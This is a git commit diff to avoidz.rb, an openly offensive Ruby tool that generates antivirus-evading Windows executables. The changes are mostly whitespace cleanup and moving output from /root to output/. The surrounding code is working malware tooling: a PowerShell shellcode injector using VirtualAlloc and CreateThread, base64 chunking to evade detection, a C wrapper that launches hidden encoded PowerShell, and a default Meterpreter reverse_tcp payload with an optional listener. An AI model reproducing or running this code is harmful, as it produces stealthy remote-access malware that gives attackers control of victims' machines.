37005c28a392f550963ebb17277151af15b6284f
demonsec666 <demonsec666@gmail.com>
2017-09-15 06:56:56 -0500

    avoidz
    avoidz

--- avoidz.rb
+++ avoidz.rb
@@ -6,11 +6,11 @@
 #
 #                  Created By Mascerano Bachir .
 #                 Website: http://www.dev-labs.co
-#           YTB : https://www.youtube.com/c/mascerano%20bachir  
+#           YTB : https://www.youtube.com/c/mascerano%20bachir
 #        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
 #
 # this is an open source tool if you want to modify or add something . Please give me a copy.
-         
+
 
 require 'colorize'
 require 'artii'
@@ -30,7 +30,7 @@ optparse = OptionParser.new do|opts|
 
     opts.banner = "Usage: avoidz.rb [options]"
     opts.separator ""
-    
+
     options[:lhost] = "127.0.0.1"
     options[:lport] = "4444"
     options[:payload] = "windows/meterpreter/reverse_tcp"
@@ -39,11 +39,11 @@ optparse = OptionParser.new do|opts|
     opts.on('-h', '--lhost value', "ip_addr|default = 127.0.0.1") do |h|
         options[:lhost] = h
     end
-    
+
     opts.on('-p', '--lport value', "port_number|default = 4444") do |p|
                 options[:lport] = p
         end
-    
+
     opts.on('-m', '--payload value', "payload to use|default = windows/meterpreter/reverse_tcp") do |m|
                 options[:payload] = m
         end
@@ -97,7 +97,7 @@ def gen_PS_shellcode()
     #remove last unnecessary comma
     resultsS = resultsS.chop
 
-   
+
     #powershell script to be executed pre-encode
     finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"
 
@@ -107,13 +107,13 @@ def gen_PS_shellcode()
 
     #string to base64 - final
     finPS = Base64.encode64(utfEncoded).gsub(/\n/, '')
-    
+
     return finPS
 end
 
 
 def prep_PS_chunk(ps_shellcode)
-    #The below iterates through the string and chops up strings into 254 character lengths & puts it into a 2-dimensional array   
+    #The below iterates through the string and chops up strings into 254 character lengths & puts it into a 2-dimensional array
     splitup = []
     splitup = ps_shellcode.scan(/.{1,254}/)
 
@@ -129,7 +129,7 @@ def prep_PS_chunk(ps_shellcode)
 
     varFinal=varFinal[0..-2]  #create the final command that will be executed, this removes the "+" sign from the last command
     return stringCommands + "\n" + varFinal
-end 
+end
 
 b = Artii::Base.new :font => 'slant'
 puts b.asciify('generate').red
@@ -151,7 +151,7 @@ exeTEMPLATE = %{#include <stdio.h>
 #include <windows.h>
 int shellCode(){
 	system("color 63");
-	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
+	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
 	/*
 		((Shell Code into the console))
 	*/
@@ -174,15 +174,15 @@ int main(){
 c_file_temp = File.new("c_file_temp.c", "w")
 c_file_temp.write(exeTEMPLATE)
 c_file_temp.close
-   
+
 #compiling will require MinGW installed - "apt-get install mingw32"
 puts "\n[*] compiling to exe......".yellow
 
-system("i586-mingw32msvc-gcc c_file_temp.c -o /root/temp1.exe -lws2_32 -mwindows")
+system("i586-mingw32msvc-gcc c_file_temp.c -o output/temp1.exe -lws2_32 -mwindows")
 system("rm c_file_temp.c")
 
 puts "-------------------------------------------------".light_blue
-puts "[*] payload exec generated in /root/temp1.exe [*]".light_blue
+puts "[*] payload exec generated in output/temp1.exe [*]".light_blue
 puts "-------------------------------------------------".light_blue
 
 puts "\n[*] Would you like to start a listener? (Y/n)".yellow
@@ -203,7 +203,7 @@ if $loutput == "temp2"
 #determine if MinGW has been installed, support new and old MinGW system paths
 mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
 if mingw == false
-    puts "[*] You must have MinGW-32 installed in order to compile EXEs!!".red	
+    puts "[*] You must have MinGW-32 installed in order to compile EXEs!!".red
     puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
     exit 1
 end
@@ -236,11 +236,11 @@ c_file_temp.close
 #compiling will require MinGW installed - "apt-get install mingw32"
 puts "\n[*] compiling to exe......".yellow
 
-system("i586-mingw32msvc-gcc c_file_temp.c -o /root/temp2.exe -lws2_32 -mwindows > /dev/null 2>&1")
+system("i586-mingw32msvc-gcc c_file_temp.c -o output/temp2.exe -lws2_32 -mwindows > /dev/null 2>&1")
 system("rm c_file_temp.c")
 
 puts "-------------------------------------------------".light_blue
-puts "[*] payload exec generated in /root/temp2.exe [*]".light_blue
+puts "[*] payload exec generated in output/temp2.exe [*]".light_blue
 puts "-------------------------------------------------".light_blue
 
 puts "\n[*] Would you like to start a listener? (Y/n)".yellow
@@ -261,7 +261,7 @@ if $loutput == "temp3"
 #determine if Monodevelop has been installed .
 mingw = true if File::exists?('/usr/lib/monodevelop') || File::exists?('/usr/bin/monodevelop')
 if mingw == false
-    puts "[*] You must have Monodevelop installed in order to compile EXEs!!".red	
+    puts "[*] You must have Monodevelop installed in order to compile EXEs!!".red
     puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
     exit 1
 end
@@ -293,11 +293,11 @@ c_file_temp.close
 #compiling will require Monodevelop installed - "apt-get install monodevelop"
 puts "\n[*] compiling to exe......".yellow
 
-system("mcs c_file_temp.c -out:/root/temp3.exe")
+system("mcs c_file_temp.c -out:output/temp3.exe")
 system("rm c_file_temp.c")
 
 puts "-------------------------------------------------".light_blue
-puts "[*] payload exec generated in /root/temp3.exe [*]".light_blue
+puts "[*] payload exec generated in output/temp3.exe [*]".light_blue
 puts "-------------------------------------------------".light_blue
 
 puts "\n[*] Would you like to start a listener? (Y/n)".yellow
@@ -312,4 +312,3 @@ else
 		puts "\n\n Good Bye!".yellow
 	end
 end
-
